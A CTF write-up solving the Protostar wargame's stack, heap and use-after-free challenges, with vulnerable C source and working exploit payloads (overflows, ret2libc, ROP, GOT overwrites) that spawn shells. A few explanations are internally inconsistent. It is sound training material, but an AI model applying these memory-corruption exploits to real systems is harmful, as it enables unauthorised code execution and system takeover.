---
title: "Protostar Wargame Writeup"
date: 2019-01-01
description: "Protostar wargame solutions: stack buffer overflow, format string bugs, heap exploitation, and network challenges"
tags: ["Protostar", "pwn", "buffer-overflow", "format-string", "heap", "wargame"]
platform: "wargame"
category: "pwn"
difficulty: "easy-medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Stack0

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

The `gets()` function reads into a 64-byte buffer with no bounds checking. The `modified` variable sits immediately after `buffer` on the stack. Writing more than 64 bytes overwrites `modified`.

### Exploit

```python
import os
import subprocess
from struct import *

payload = ""
payload += "A"*64
payload += "B"*4

p = subprocess.Popen("./stack0", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
print p.communicate(payload)[0]
```

---

## Stack1

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Input is taken via command-line argument using `strcpy`. The target value for `modified` is `0x61626364` (`"dcba"` in ASCII, little-endian: `"abcd"`).

### Exploit

```python
import os
import subprocess
from struct import *

p = lambda x:pack("<L", x)

payload = ""
payload += "A"*64
payload += p(0x61626364)

os.system("./stack1" + " " + payload)
```

---

## Stack2

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Input is read from the `GREENIE` environment variable. The target value is `0x0d0a0d0a` (CRLF bytes). Since these are non-printable characters, packing them as a little-endian integer is necessary.

### Exploit

```python
from subprocess import Popen, PIPE
from struct import pack
import os

p32 = lambda x:pack("<L", x)

payload = ""
payload += "A"*64
payload += p32(0x0d0a0d0a)

os.environ["GREENIE"]=payload

p = Popen("./stack2", stdin=PIPE, stdout=PIPE)
print p.communicate()[0]
```

---

## Stack3

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

A function pointer `fp` is stored on the stack adjacent to `buffer`. Overflowing `buffer` allows overwriting `fp` with the address of `win()`, which then gets called.

### Exploit

```python
import os
from subprocess import Popen, PIPE
from struct import *

p = lambda x:pack("<L", x)
win = 0x8048486

payload = ""
payload += "A"*64
payload += p(win)

p = Popen("./stack3", stdin=PIPE, stdout=PIPE)
print p.communicate(payload)[0]
```

---

## Stack4

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Classic return address overwrite. The buffer is 64 bytes, followed by the saved frame pointer (4 bytes), then the saved return address. Overwrite `ret` with the address of `win()`.

### Exploit

```bash
(perl -e 'print "A"x64, "B"x4, "C"x4, "\x56\x84\x04\x08"'; cat) | ./stack4

code flow successfully changed
```

---

## Stack5

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

No win function this time — shellcode execution required. NX is not enabled, so shellcode placed in the buffer can be jumped to directly. The payload overwrites the return address to redirect execution into a `system()` call via ret2libc.

### Exploit

```bash
(perl -e 'print "A"x72, "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack5
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
```

The addresses correspond to `system()` and `/bin/sh` in libc, making this a ret2libc attack.

---

## Stack6

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;
  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Stack6 blocks return addresses in the `0xbf000000` range (the stack). This prevents jumping directly to shellcode on the stack. The bypass is ret2libc — the return address points to `system()` in libc, which is not in that blocked range.

### Exploit

```bash
(perl -e 'print "A"x76, "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack6
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
```

---

## Stack7

### Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Stack7 blocks addresses starting with `0xb0000000`, which covers both the stack (`0xbf...`) and most libc addresses (`0xb7...`). The solution is to use a ROP gadget in the binary's own `.text` section to pivot into a ret2libc chain. The gadget `ret` can be used to align the chain.

### Exploit

```bash
(perl -e 'print "A"x76, "\xae\x85\x04\x08", "\x80\x8d\xe2\xf7", "AAAA", "\x8f\x7b\xf6\xf7"'; cat) | ./stack7
input path please:
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...

id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),114(netdev)
```

The `0x080485ae` gadget is a `ret` instruction in the binary text segment, used to pivot past the filter before landing in `system()`.

---

## Heap0

A straightforward heap overflow where `strcpy` writes past the allocated chunk boundary into an adjacent structure. Overwriting the function pointer in the adjacent object redirects execution to `winner()`.

### Exploit

```bash
./heap0 $(perl -e 'print "A"x64, "B"x16, "\xb6\x84\x04\x08"')
```

---

## Heap1

Two heap-allocated structures sit adjacent in memory. Each contains a name pointer and a priority field. The layout in memory:

```
| prev | size | prio | name* |
i1      | NULL | 0x11 |  1   | addr  |
name    | NULL | 0x11 |     AAAA     |
i2      | NULL | 0x11 |  2   | addr  |
name    | NULL | 0x11 |     BBBB     |
```

By overflowing `i1->name` with enough bytes, the `name` pointer of `i2` can be overwritten to point to `puts@GOT`. Then writing the address of `winner()` into `i2->name` triggers a GOT overwrite when `puts` is called.

```
strcpy(i1->name, argv[1])  →  A*20 + puts_got  (overwrites i2->name*)
strcpy(i2->name, argv[2])  →  &winner          (overwrites puts GOT entry)
```

### Exploit

```bash
./heap1 $(perl -e 'print "A"x20, "\x1c\xa0\x04\x08"') $(perl -e 'print "\xe6\x84\x04\x08"')
and we have a winner @ 1605236809
```

---

## Heap2

### Source

```c
struct auth {
    char name[32];
    int auth;
};

struct auth *auth;
char *service;
```

The program maintains an `auth` struct and a `service` pointer. When `free(auth)` is called, the memory is returned to the heap allocator but the pointer itself is not cleared (use-after-free). When a new `service` string is allocated with `strdup`, it can land on the same freed chunk if the allocation size matches.

### Analysis

The exploit sequence:

1. `auth AAAA...` — allocate auth struct, fill name field
2. `service` — allocate service on adjacent chunk
3. `reset` — free auth (pointer not cleared)
4. `service` — strdup allocates on the freed auth chunk, overwriting `auth->auth`
5. `login` — auth->auth is now non-zero, login succeeds

```
auth AAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804b980, service = (nil) ]
service
[ auth = 0x804b980, service = 0x804b990 ]
reset
[ auth = 0x804b980, service = 0x804b990 ]
service
[ auth = 0x804b980, service = 0x804b980 ]
login
please enter your password
service
[ auth = 0x804b980, service = 0x804b9a0 ]
login
you have logged in already!
```

---

## Heap3

### Source

```c
void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

This challenge demonstrates a classic dlmalloc unlink exploit. The heap layout after allocation:

```
0x804c000:  0x00000000  0x00000029  0x41414141  ...
0x804c020:  ...         0x00000029  0x42424242  ...
0x804c050:  ...         0x00000029  0x43434343  ...
```

Each chunk has a 8-byte header (`prev_size` + `size`). The `fd` and `bk` pointers (used only when free) follow. By overflowing chunk `c` into the boundary between chunks, a crafted fake chunk triggers the unlink macro during `free()`, writing an arbitrary 4-byte value to an arbitrary address — the classic write-what-where primitive used to overwrite `printf@GOT` with `winner()`.

The `malloc_chunk` structure:

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;
  INTERNAL_SIZE_T      size;
  struct malloc_chunk* fd;
  struct malloc_chunk* bk;
};
```
